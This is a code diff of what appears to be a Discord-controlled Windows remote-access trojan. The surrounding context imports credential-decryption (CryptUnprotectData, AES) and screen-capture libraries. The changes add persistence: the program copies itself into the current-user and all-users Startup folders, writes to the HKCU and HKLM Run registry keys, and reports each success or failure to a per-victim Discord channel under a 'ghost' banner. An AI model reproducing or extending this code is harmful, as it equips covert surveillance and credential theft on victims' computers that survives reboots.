@@ -15,15 +15,16 @@ import pyautogui
 import win32crypt
 import subprocess
 import numpy as np
+import winreg as reg
 from Crypto.Cipher import AES
 from datetime import datetime
 from discord.ext import commands
 from win32crypt import CryptUnprotectData
 
 # Constants
-TOKEN = "token" # Discord bot token
+TOKEN = "TOKEN" # Discord bot token
 USERNAME = os.getenv("USERNAME")  # Windows username
-GUILD_ID = "GUILD_ID"  # Replace with your actual server ID
+GUILD_ID = 000000000000000000000  # Replace with your actual server ID (Interger)
 
 # Vars for bot
 intents = discord.Intents.default()
@@ -31,6 +32,12 @@ intents.messages = True
 intents.message_content = True # Allow bot to read messages from discord channel
 intents.guilds = True # Enables interaction with discord server
 bot = commands.Bot(command_prefix='!', intents=intents) # Bot prefix
+
+#start check vars
+startup_folder_flag_C = False
+startup_folder_flag_A = False
+register_flag_C = False
+register_flag_A = False
 
 #screen recording vars
 recording_task = None
@@ -56,27 +63,55 @@ def get_mac_address():
         return f"Error getting MAC address: {e}"
 
 def copy_to_start(program_to_copy):
+    global startup_folder_flag_A
+    global startup_folder_flag_C
     try:
         a_users = os.path.join(os.environ["ProgramData"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
         c_user = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-
         os.makedirs(a_users, exist_ok=True)
         os.makedirs(c_user, exist_ok=True)
         try:
             shutil.copy2(program_to_copy, a_users)
             print(f"Successfully copied to: {a_users}")
+            startup_folder_flag_A = True
         except Exception as e:
             print("All user error:", e)
         try:
             shutil.copy2(program_to_copy, c_user)
             print(f"Successfully copied to: {c_user}")
+            startup_folder_flag_C = True
         except Exception as e:
             print("Current user error:", e)
 
     except Exception as e:
         print(f"There has been an error:\n{e}")
-        os.system("pause")
 
+def add_to_register(program_path):
+    c_user = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+    program_name = os.path.basename(program_path)
+    global register_flag_A
+    global register_flag_C
+    try:
+        key = r"SOFTWARE\Microsoft\WIndows\CurrentVersion\Run"
+        try: # Current user
+            register_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
+            reg.SetValueEx(register_key, program_name, 0, reg.REG_SZ, c_user)
+            print(f"Program is added to register: {program_name}")
+            reg.CloseKey(register_key)
+            register_flag_C = True
+        except Exception as e:
+            print(e)
+        try: # all user
+            register_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, key, 0, reg.KEY_SET_VALUE)
+            reg.SetValueEx(register_key, program_name, 0, reg.REG_SZ, c_user)
+            print(f"Program is added to register: {program_name}")
+            reg.CloseKey(register_key)
+            register_flag_A = True
+        except Exception as e:
+            print(e)
+            
+    except Exception as e:
+        print("Register error {e}")
 
 async def main_loop():
     while True:
@@ -319,7 +354,33 @@ async def on_ready():
         channel = await guild.create_text_channel(f"{USERNAME}")
         print(f"✅ Created channel: {channel.name}")
 
-    await channel.send(f"{USERNAME} is online ✅")
+    await channel.send(f"👻{USERNAME} is online ✅")
+
+    #Start up flag debug
+    if startup_folder_flag_A or startup_folder_flag_C or register_flag_A or register_flag_C:
+        # Start up
+        if startup_folder_flag_C:
+            await channel.send("✅ - Startup folder current user")
+        elif startup_folder_flag_C == False:
+            await channel.send("❌ - Startup folder current user")
+        if startup_folder_flag_A:
+            await channel.send("✅ - Startup folder All users")
+        elif startup_folder_flag_A == False:
+            await channel.send("❌ - Startup folder All users")
+        
+        # Register
+        if register_flag_C:
+            await channel.send("✅ - Reg startup current users")
+        elif register_flag_C == False:
+            await channel.send("❌ - Reg startup current users")
+        if register_flag_A:
+            await channel.send("✅ - Reg startup all users")
+        elif register_flag_A == False:
+            await channel.send("❌ - Reg startup all users")
+    else:
+        await channel.send("❌ Both startup en register failed for all users!")
+
+
     await channel.send("""``` _____                                                               _____ 
 ( ___ )                                                             ( ___ )
  |   |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|   | 
@@ -334,7 +395,7 @@ async def on_ready():
  |   |   |    | /    ~    |    __)_                                  |   | 
  |   |   |    | \    Y    |        \                                 |   | 
  |   |   |____|  \___|_  /_______  /                                 |   | 
- |   |                 \/        \/                                  |   | 
+ |   |                 \/        \/              👻                  |   | 
  |   |   ________  ___ ___ ________    ___________________           |   | 
  |   |  /  _____/ /   |   \\_____  \  /   _____\__    ___/           |   | 
  |   | /   \  ___/    ~    \/   |   \ \_____  \  |    |              |   | 
@@ -344,6 +405,7 @@ async def on_ready():
  |___|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|___| 
 (_____)                                                             (_____)```""")
     
+       
     await channel.send("```Use !what for info ✅```")
     print(f"✅ {USERNAME} sent a message.")
 
@@ -368,6 +430,7 @@ async def on_disconnect():
 if TOKEN:
     program_path = os.path.abspath(sys.argv[0])
     copy_to_start(program_path)
+    add_to_register(program_path)
     bot.run(TOKEN)
 else:
     print("❌ Bot token is missing! Set the DISCORD_BOT_TOKEN environment variable.")
